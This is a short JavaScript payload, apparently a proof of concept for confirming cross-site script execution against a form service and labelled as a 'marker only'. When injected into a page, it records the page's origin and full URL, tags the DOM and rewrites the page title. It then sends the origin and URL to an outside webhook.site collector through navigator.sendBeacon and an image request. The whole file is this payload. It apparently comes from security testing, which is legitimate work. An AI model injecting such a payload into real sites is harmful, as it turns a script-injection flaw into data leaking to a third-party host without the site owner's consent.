/* AIAMR-1040-pm marker only */
(function(){
  var o=(function(){try{return location.origin}catch(e){return null}})();
  var h=(function(){try{return location.href}catch(e){return null}})();
  var r={tag:'gist',origin:o,href:h,at:Date.now()};
  try{window.__AIAMR_1040_PM_EXEC=r;}catch(e){}
  try{document.documentElement.setAttribute('data-aiamr-1040-pm-exec','1');}catch(e){}
  try{document.title='AIAMR-1040-PM-EXEC '+o;}catch(e){}
  try{navigator.sendBeacon('https://webhook.site/156aa60d-29c4-43fa-b37f-ed55d9007ce4/jotform/1040-pm/exec-gist',JSON.stringify(r));}catch(e){}
  try{(new Image()).src='https://webhook.site/156aa60d-29c4-43fa-b37f-ed55d9007ce4/jotform/1040-pm/exec-img-gist?o='+encodeURIComponent(String(o));}catch(e){}
})();
